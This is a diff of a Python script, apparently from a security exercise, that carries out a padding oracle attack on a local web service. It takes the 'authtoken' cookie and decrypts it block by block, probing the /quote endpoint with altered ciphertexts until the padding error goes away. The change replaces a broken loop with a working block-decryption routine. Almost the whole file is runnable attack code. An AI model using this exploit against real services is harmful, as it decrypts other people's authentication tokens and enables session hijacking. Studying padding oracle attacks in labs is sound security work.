@@ -1,92 +1,72 @@
 import requests
 import secrets
 
-basepath = 'http://10.0.2.2:5000'
+basepath = 'http://localhost:5000'
 quotepath = basepath + '/quote'
 
 #Based on https://robertheaton.com/2013/07/29/padding-oracle-attack/
 #Might be overcomplicating it, at least it does not seem to work as expected.
 
 def extractTokenFrom(response):
-    tokenHeader = response.cookies.get('authtoken')
-    #print(tokenHeader.decode())
-    return tokenHeader
+ tokenHeader = response.cookies.get('authtoken')
+ return tokenHeader
 
 def askPaddingOracle(ciphertext):
-    cookies = {'authtoken': ciphertext.hex()}
-    response = requests.get(quotepath, cookies = cookies)
-    return response
+ cookies = {'authtoken': ciphertext.hex()}
+ response = requests.get(quotepath, cookies = cookies)
+ return response
 
+#Decrypts a block of 16 bytes
+def decryptBlock(previousBlock, blockToDecrypt):
+ intermediateStateBytes = bytearray(16)
+ decryptedPlainText = bytearray(16)
+    
+ for byteindex in range(15, -1, -1):
+  paddingvalue = 16 - byteindex
+  sneakyPreviousBlock = bytearray(16)
+     
+  for index in range(15, byteindex, -1):
+   sneakyPreviousBlock[index] = paddingvalue ^ intermediateStateBytes[index]
+     
+  for value in range(0,256):
+   sneakyPreviousBlock[byteindex] = value
+   blockToSend = sneakyPreviousBlock + blockToDecrypt
+   
+   response = askPaddingOracle(blockToSend)
+   
+   if 'padding is incorrect' not in response.text.lower():
+    previousBlockValue = previousBlock[byteindex]
+    intermediateByteValue = value ^ paddingvalue
+    intermediateStateBytes[byteindex] = intermediateByteValue
+    plaintextByte = previousBlockValue ^ intermediateByteValue
+    decryptedPlainText[byteindex] = plaintextByte
+    print('Decrypted byte, the current block is now: ' + str(decryptedPlainText.decode().upper()))
+    break
+   else:
+    continue
+ 
+ print('Block is decrypted to be - ' + decryptedPlainText.decode().upper())
+ return decryptedPlainText
+
+#Assumes the ciphertext is 4 blocks of 16 bytes, could be made more generic
 def runPOAttack(ciphertext):
-    cipherbytes = (bytes.fromhex(ciphertext))
-
-    cipherblock1 = bytearray(cipherbytes[0:16])
-    cipherblock2 = bytearray(cipherbytes[16:32])
-    cipherblock3 = bytearray(cipherbytes[32:48])
-    cipherblock4 = bytearray(cipherbytes[48:])
-
-    #print(cipherblock1)
-    #print(cipherblock2)
-    #print(cipherblock3)
-    #print(cipherblock4)
-
-    i2 = bytearray(16)
-    c1 = cipherblock3
-    c2 = cipherblock4
-
-    for byteindex in range(15,-1,-1):
-        c1dot = bytearray(16)
-        #for value in range(14, byteindex-1, -1):
-         #   c1dot[value] = 0
-
-        for value in range(0,256):
-            c1dot[15] = value
-
-            response = askPaddingOracle(c1dot + c2)
-            if 'padding is incorrect' not in response.text.lower():
-                c1dotvalue = value
-                p2dotvalue = (0 + (16 - byteindex))
-                i2[byteindex] = c1dotvalue ^ p2dotvalue
-                print(c1dot)
-                print(i2)
-                break
-            else:
-                continue
-
-    p2 = bytearray(16)
-
-    for value in range(0,16):
-        p2[value] = c1[value] ^ i2[value]
-
-    print(p2.decode('utf-8', 'ignore'))
-    #print(p2)
-    #print(p2.decode('utf-8', 'ignore'))
-
-
-    #c2 = bytearray(cipherbytes[48:])
-    #c1 = bytearray(cipherbytes[32:48])
-
-    #c1_ = bytearray(secrets.token_bytes(16))
-
-    #i2 = bytearray(16)
-    #p2_ = bytearray(16)
-
-    #Decrypt first byte
-    #for value in range(0,255):
-    #    c1_[15] = value
-    #    concatenated = c1_ + c2
-    #    response = askPaddingOracle(concatenated)
-    #    if 'padding is incorrect' not in response.text.lower():
-    #
-    #
-    #        break
-    ##    else:
-     #       continue
+ cipherbytes = (bytes.fromhex(ciphertext))
+ 
+ cipherblock1 = bytearray(cipherbytes[0:16])
+ cipherblock2 = bytearray(cipherbytes[16:32])
+ cipherblock3 = bytearray(cipherbytes[32:48])
+ cipherblock4 = bytearray(cipherbytes[48:])
+    
+ block4 = decryptBlock(cipherblock3, cipherblock4)
+ block3 = decryptBlock(cipherblock2, cipherblock3)
+ block2 = decryptBlock(cipherblock1, cipherblock2)
+    
+ print('Successfully decrypted full ciphertext to be - ' + (block2 + block3 + block4).decode().upper())
 
 def main():
-    ciphertext = extractTokenFrom(requests.get(basepath))
-    secret = runPOAttack(ciphertext)
+ ciphertext = extractTokenFrom(requests.get(basepath))
+ runPOAttack(ciphertext)
 
 
 if __name__ == "__main__":
-    main()
+ main()
